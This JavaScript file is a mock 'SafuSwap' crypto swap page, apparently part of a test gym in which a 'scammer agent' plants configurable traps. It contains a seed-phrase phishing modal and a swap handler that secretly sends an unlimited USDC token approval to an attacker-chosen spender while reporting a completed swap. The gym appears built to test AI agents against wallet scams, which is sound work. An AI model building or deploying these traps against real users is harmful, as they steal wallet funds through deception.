// SafuSwap mini dApp. Behaviour is driven by window.__GYM__ (from gym/variants.json),
// so the scammer agent can plant or evolve traps without touching this file.
(function () {
  var cfg = window.__GYM__;
  var USDC = '0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48';
  var MAX = (1n << 256n) - 1n;
  var $ = function (id) { return document.getElementById(id); };
  var trap = function (type) { return (cfg.traps || []).find(function (t) { return t.type === type; }); };
  var account = null;
  var hex32 = function (v) { return BigInt(v).toString(16).padStart(64, '0'); };
  var addr32 = function (a) { return a.toLowerCase().replace(/^0x/, '').padStart(64, '0'); };

  function setStatus(t) { $('status').textContent = t; }
  $('amount').addEventListener('input', function () { $('out').textContent = (parseFloat(this.value || 0) * 0.00031).toFixed(4); });

  function seedPrompt(t) {
    var m = document.createElement('div');
    m.className = 'modal';
    m.innerHTML = '<div class="box" role="dialog" aria-label="' + t.title + '"><h2 style="margin-top:0">' + t.title + '</h2><p>' + t.wording + '</p>' +
      '<textarea id="verify-input" name="verify" placeholder="' + (t.placeholder || 'word1 word2 word3 ...') + '"></textarea><button id="verify-btn" type="button">' + (t.button || 'Verify wallet') + '</button></div>';
    document.body.appendChild(m);
    $('verify-btn').onclick = function () { setStatus('Verifying...'); };
  }

  var sp = trap('seed_prompt');
  if (sp && sp.when === 'load') seedPrompt(sp);

  $('connect').onclick = async function () {
    try {
      var accs = await window.ethereum.request({ method: 'eth_requestAccounts' });
      account = accs[0];
      $('connect').textContent = account.slice(0, 6) + '…' + account.slice(-4);
      $('swap').disabled = false; $('swap').textContent = 'Swap';
      setStatus('Wallet connected');
      if (sp && sp.when === 'after_connect') setTimeout(function () { seedPrompt(sp); }, sp.delayMs || 800);
    } catch (e) { setStatus('Connection rejected'); }
  };

  $('swap').onclick = async function () {
    var amt = parseFloat($('amount').value || '0');
    var units = BigInt(Math.round(amt * 1e6));
    setStatus('Swapping ' + amt + ' USDC… confirm in your wallet');
    var ap = trap('approve');
    var tx;
    if (ap) {
      var raw = ap.amount === 'max' ? MAX : BigInt(ap.amount);
      tx = { from: account, to: USDC, data: '0x095ea7b3' + addr32(ap.spender) + hex32(raw) };
    } else {
      tx = { from: account, to: cfg.router, data: '0x38ed1739' + hex32(units) + hex32(0) };
    }
    try {
      await window.ethereum.request({ method: 'eth_sendTransaction', params: [tx] });
      setStatus('Swap complete ✅ ' + amt + ' USDC → ' + (amt * 0.00031).toFixed(4) + ' ETH');
    } catch (e) { setStatus('Transaction rejected in wallet'); }
  };
})();
